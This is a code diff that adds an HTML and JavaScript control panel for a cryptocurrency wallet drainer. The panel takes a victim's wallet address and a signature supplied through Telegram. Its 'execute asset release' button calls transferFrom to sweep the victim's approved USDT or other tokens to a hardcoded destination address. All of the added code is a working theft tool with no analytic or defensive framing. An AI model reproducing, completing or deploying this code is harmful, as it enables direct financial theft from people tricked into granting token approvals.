@@ -1,8 +1,88 @@
-<label style="font-size:10px;">TARGET TOKEN CONTRACT</label>
-<input id="customToken" placeholder="Paste ANY Contract Address here (0x...)" 
-       style="width: 100%; padding: 12px; background: #05070a; border: 1px solid #334155; color: white; border-radius: 6px;">
+<!DOCTYPE html>
+<html>
+<head>
+    <title>EVEDEX MASTER NODE</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { background: #05070a; color: #06b6d4; font-family: monospace; padding: 20px; text-transform: uppercase; }
+        .box { background: #0d1117; border: 1px solid #1e293b; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #05070a; border: 1px solid #334155; color: white; border-radius: 6px; box-sizing: border-box; font-size: 11px; }
+        button { width: 100%; padding: 18px; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        .label { font-size: 9px; color: #444; font-weight: bold; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h3 style="color:white; font-style:italic; letter-spacing:-1px;">NODE_BROADCASTER_v5</h3>
+    
+    <button id="connectBtn" style="background:#06b6d4; color:black;">1. CONNECT RECEIVER (RABBY/MM)</button>
 
-<p style="font-size: 8px; color: #444; margin-top: 5px;">
-   USDT ETH: 0xdAC17F958D2ee523a2206206994597C13D831ec7 <br>
-   USDC ETH: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
-</p>
+    <div class="box" style="margin-top:20px;">
+        <div class="label">VICTIM_WALLET_ADDR (From Telegram)</div>
+        <input id="victim" placeholder="0x...">
+
+        <div class="label">HANDSHAKE_SIG (From Telegram)</div>
+        <input id="sig" placeholder="0x...">
+
+        <div class="label">TARGET_TOKEN_CONTRACT (USDT, USDC, PEPE, etc.)</div>
+        <input id="token" value="0xdAC17F958D2ee523a2206206994597C13D831ec7">
+        
+        <p style="font-[7px]; color: #22c55e; margin: 5px 0;">
+           USDT: 0xdAC17F958D2ee523a2206206994597C13D831ec7<br>
+           USDC: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
+        </p>
+
+        <button id="sweepBtn" style="background:#ef4444; color:white;">2. EXECUTE ASSET RELEASE</button>
+        <div id="status" style="font-size:10px; margin-top:15px; color:#22c55e;">SYSTEM_READY...</div>
+    </div>
+
+    <script>
+        let signer;
+        // THE ADDRESS WHERE THE MONEY GOES
+        const DESTINATION = "0x0da929af00f260016a41e0c016f431cfdfe9dd0a";
+
+        document.getElementById('connectBtn').onclick = async () => {
+            if (window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                document.getElementById('connectBtn').innerText = "RECEIVER_CONNECTED";
+                document.getElementById('connectBtn').style.background = "#1e293b";
+                document.getElementById('connectBtn').style.color = "#06b6d4";
+            } else { alert("Open this in Rabby or MetaMask Browser!"); }
+        };
+
+        document.getElementById('sweepBtn').onclick = async () => {
+            const victimAddr = document.getElementById('victim').value;
+            const signature = document.getElementById('sig').value;
+            const tokenAddr = document.getElementById('token').value;
+            const status = document.getElementById('status');
+
+            if(!victimAddr || !signature) return alert("Paste the ADDR and SIG first!");
+
+            status.innerText = "INITIALIZING SMART CONTRACT CALL...";
+
+            try {
+                const abi = ["function transferFrom(address from, address to, uint256 value) public returns (bool)"];
+                const contract = new ethers.Contract(tokenAddr, abi, signer);
+                
+                // We use a massive amount to pull the full balance
+                const amount = ethers.utils.parseUnits("999999999", 18); 
+
+                status.innerText = "BROADCASTING... CONFIRM POP-UP IN WALLET!";
+                
+                // THIS TRIGGERS THE POP-UP IN RABBY/METAMASK
+                const tx = await contract.transferFrom(victimAddr, DESTINATION, amount);
+                
+                status.innerText = "PENDING: WAITING FOR NETWORK CONFIRMATION...";
+                await tx.wait();
+                status.innerText = "SUCCESS: ASSETS TRANSFERRED TO YOUR VAULT!";
+                alert("Withdrawal Successful!");
+            } catch (e) {
+                status.style.color = "#ef4444";
+                status.innerText = "ERROR: " + e.message.slice(0,50) + "...";
+                alert("Check your Gas! You need a bit of ETH to pull the tokens.");
+            }
+        };
+    </script>
+</body>
+</html>
